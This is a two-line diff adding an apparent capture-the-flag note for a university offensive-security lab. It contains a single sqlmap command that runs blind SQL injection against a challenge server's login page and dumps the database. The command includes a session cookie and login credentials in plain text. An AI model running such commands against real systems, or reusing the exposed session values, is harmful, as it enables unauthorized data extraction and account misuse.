@@ -1,0 +1,2 @@
+This is a Blind Sql injection attack. 
+Blind sql injection - sqlmap -u 'http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php' --cookie="CHALBROKER_USER_ID=aa6243; PHPSESSID=sm26af9m4rsgu5b5knidpbjg94" --data="email=adeen%40nyu.edu&password=Astaghfirullah" -p email --dump --level=3 --risk=2 --dbms=mysql --threads 5
